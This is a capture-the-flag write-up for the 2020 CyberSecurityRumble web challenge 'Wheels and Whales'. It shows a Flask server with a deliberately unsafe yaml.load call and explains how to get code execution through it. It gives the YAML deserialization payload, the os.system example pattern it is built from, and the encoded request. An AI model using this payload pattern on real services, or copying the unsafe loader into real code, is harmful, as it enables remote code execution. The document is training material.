---
ctf: CyberSecurityRumble
year: 2020
tags:
  - web
  - ace
---

# CyberSecurityRumble CTF

## Web

### Wheels and Whales

The goal is this challenge is to run the function `flag.get_flag()`.
The code of the server is provided below, even though most is fluff.

```python
import yaml
from flask import redirect, Flask, render_template, request, abort
from flask import url_for, send_from_directory, make_response, Response
import flag

app = Flask(__name__)

EASTER_WHALE = {"name": "TheBestWhaleIsAWhaleEveryOneLikes", "image_num": 2, "weight": 34}

@app.route("/")
def index():
    return render_template("index.html.jinja", active="home")


class Whale:
    def __init__(self, name, image_num, weight):
        self.name = name
        self.image_num = image_num
        self.weight = weight

    def dump(self):
        return yaml.dump(self.__dict__)


@app.route("/whale", methods=["GET", "POST"])
def whale():
    if request.method == "POST":
        name = request.form["name"]
        if len(name) > 10:
            return make_response("Name to long. Whales can only understand names up to 10 chars", 400)
        image_num = request.form["image_num"]
        weight = request.form["weight"]
        whale = Whale(name, image_num, weight)
        if whale.__dict__ == EASTER_WHALE:
            return make_response(flag.get_flag(), 200)
        return make_response(render_template("whale.html.jinja", w=whale, active="whale"), 200)
    return make_response(render_template("whale_builder.html.jinja", active="whale"), 200)


class Wheel:
    def __init__(self, name, image_num, diameter):
        self.name = name
        self.image_num = image_num
        self.diameter = diameter

    @staticmethod
    def from_configuration(config):
        return Wheel(**yaml.load(config, Loader=yaml.Loader)) # insecure load

    def dump(self):
        return yaml.dump(self.__dict__)


@app.route("/wheel", methods=["GET", "POST"])
def wheel():
    if request.method == "POST":
        if "config" in request.form:
            wheel = Wheel.from_configuration(request.form["config"]) # load usage
            return make_response(render_template("wheel.html.jinja", w=wheel, active="wheel"), 200)
        name = request.form["name"]
        image_num = request.form["image_num"]
        diameter = request.form["diameter"]
        wheel = Wheel(name, image_num, diameter)
        print(wheel.dump())
        return make_response(render_template("wheel.html.jinja", w=wheel, active="wheel"), 200)
    return make_response(render_template("wheel_builder.html.jinja", active="wheel"), 200)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
```

The server is able to serialize and deserialize `yaml`,
we can leverage the usage of an insecure loader to get ACE.

We are in luck as the function has recently deprecated and `pyyaml`'s wiki has a [post](https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation) explaining the reasons and providing an example.

The example is as follows:

```sh
python -c 'import yaml; yaml.load("!!python/object/new:os.system [echo EXPLOIT!]")'
```

From the example we can craft our own payload,
`name` contains the malicious command which calls `flag.get_flag`,
with `[]` as argument since the function does not take any.

This will evaluate the call and return the flag as our wheel name.

```
name: !!python/object/new:flag.get_flag []
image_num: 2
diameter: 2
```

What is left is to send a request with `?config=name:%20!!python/object/new:flag.get_flag%20%5B%5D%0Aimage_num:%202%0Adiameter:%202`.

